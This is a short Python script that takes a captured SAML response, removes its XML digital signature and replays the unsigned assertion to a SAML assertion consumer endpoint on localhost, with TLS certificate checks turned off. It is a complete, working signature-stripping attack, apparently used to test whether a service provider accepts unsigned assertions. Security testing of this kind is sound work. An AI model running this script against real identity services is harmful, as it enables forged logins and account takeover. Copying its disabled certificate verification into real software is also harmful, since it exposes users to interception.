import base64, re, ssl, urllib.parse, urllib.request, urllib.error

raw = open("tools/captured_response.txt").read()
m = re.search(r"SAMLResponse=([^&\s'\"]*)", raw)
val = m.group(1) if m else raw.strip()
b64 = urllib.parse.unquote(val).replace(" ", "+").strip()
b64 += "=" * (-len(b64) % 4)
xml = base64.b64decode(b64).decode("utf-8")
new_xml = re.sub(r"<ds:Signature.*?</ds:Signature>", "", xml, flags=re.S)
print("Signature removed:", new_xml != xml)
data = urllib.parse.urlencode({"SAMLResponse": base64.b64encode(new_xml.encode()).decode()}).encode()
ctx = ssl._create_unverified_context()
try:
    r = urllib.request.urlopen("https://localhost:5443/saml/acs", data=data, context=ctx)
    print("HTTP", r.status)
except urllib.error.HTTPError as e:
    print("HTTP", e.code)
